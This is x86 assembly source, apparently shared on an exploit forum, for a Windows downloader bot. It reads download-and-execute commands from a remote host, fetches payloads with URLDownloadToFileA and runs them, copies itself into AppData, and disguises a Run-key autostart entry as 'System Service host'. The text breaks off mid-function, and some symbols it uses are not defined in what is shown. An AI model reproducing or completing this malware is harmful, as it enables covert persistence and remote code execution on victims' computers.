include 'win32ax.inc'

;~~~~By Nu11ers3t~~~~;
;~~~~~exploit.in~~~~~;
;~~~~~~Commands~~~~~~;
;!DOWNLOAD:[url]http://mysite.com/file.exe@URLDownloadToFileA[/url]!  - Will download & execute a file from [url]http://mysite.com/file.exe[/url]
;!IDLE:Content1@Content2!
;!CLEAR:Content1@Content2! - set Download flag to zero

section '.code' code readable writeable executable


host	db 'myhost.com',0
page	db '/file.php',0

urlmon db 'urlmon.dll',0
MyFile	 db 'qazxsw003.exe',0
InstallFileName db 'Servicer.exe',0
AppData  db 'AppData',0
AutoKey db 'Software\Microsoft\Windows\CurrentVersion\Run',0
ValueName db 'System Service host',0
hkey dd ?

Restart:
push	PAGE_READWRITE
push	MEM_COMMIT
push	265
push	0
call	[VirtualAlloc]
mov	ebx, eax
push	256
push	ebx
push	0
call	[GetModuleFileNameA]

push	SW_SHOW
push	0
lea	eax, [ebx + 256]
mov	dword [eax], '!!!!'
mov	byte [eax + 4], 0
push	eax
push	ebx
push	open
push	0
call	[ShellExecuteA]
push	0
call	[ExitProcess]


Install:
push	PAGE_READWRITE
push	MEM_COMMIT
push	256
push	0
call	[VirtualAlloc]
mov	esi, eax
push	512
push	esi
push	AppData
call	[GetEnvironmentVariable]
push	esi
call	[lstrlen]
mov	byte [eax + esi], '\'
push	InstallFileName
push	esi
call	[lstrcat]

lea	edi, [esi + 256]
push	256
push	edi
push	0
call	[GetModuleFileNameA]

push	esi
call	[GetFileAttributes]

inc	eax
je	NotFound

push	esi
call	[DeleteFileA]

NotFound:

push	0
push	esi
push	edi
call	[CopyFileA]

push	SW_SHOW
push	0
mov	dword [edi], '!!!!'
mov	byte [edi + 4], 0
push	edi
push	esi
push	open
push	0
call	[ShellExecuteA]

push	esi
call	[lstrlen]
mov	dword [esi + eax], ' !!!'
mov	byte [esi + eax + 4], '!'
mov	byte [esi + eax + 5], 0

push	0
lea	eax, [hkey]
push	eax
push	0
push	KEY_ALL_ACCESS
push	0
push	0
push	0
push	AutoKey
push	HKEY_CURRENT_USER
call	[RegCreateKeyEx]

push	esi
call	[lstrlen]

push	eax
push	esi
push	REG_SZ
push	0
push	ValueName
mov	eax, dword [hkey]
push	eax
call	[RegSetValueEx]

mov	eax, dword [hkey]
push	eax
call	[RegCloseKey]

jmp	Exit

cls:
mov	dword [Downloaded], 0
jmp	Next

Downloader:
mov	eax, dword [Downloaded]
test	eax, eax
jnz	Next
inc	dword [Downloaded]

push	PAGE_READWRITE
push	MEM_COMMIT
push	256
push	0
call	[VirtualAlloc]
mov	esi, eax
push	esi
push	256
call	[GetTempPathA]

push	MyFile
push	esi
call	[lstrcatA]

push	esi
call	[GetFileAttributes]
inc	eax
je	OK

push	esi
call	[DeleteFileA]

OK:

push	urlmon
call	[LoadLibraryA]
mov	ecx, dword [ebp - 12]
push	ecx
push	eax
call	[GetProcAddress]
test	eax, eax
je	Next
push	0
push	0
push	esi
mov	edx, dword [ebp - 8]
push	edx
push	0
call	eax


push	SW_SHOW
push	0
push	0
push	esi
push	open
push	0
call	[ShellExecuteA]

push	MEM_RELEASE
push	0
push	esi
call	[VirtualFree]

jmp	Next

Connect: ; void connect(char *edi);
push	esi
push	ebp
mov	ebp, esp
sub	esp, 12
push	PAGE_READWRITE
push	MEM_COMMIT
push	1537
push	0
call	[VirtualAlloc]
mov	[ebp + 12], eax

push	page
push	host
push	formatString
push	eax
call	[wsprintfA]
add	esp, 16

push	wininet
call	[LoadLibraryA]
mov	esi, eax

mov	eax, dword [ebp + 12]
add	eax, 1024
mov	dword [eax], 'Acce'
mov	dword [eax + 4], 'pt: '
mov	dword [eax + 8], '*/*\'
mov	dword [eax + 12], 'r\n\'
mov	word [eax + 16], 'r\'
mov	byte [eax + 18], 'n'
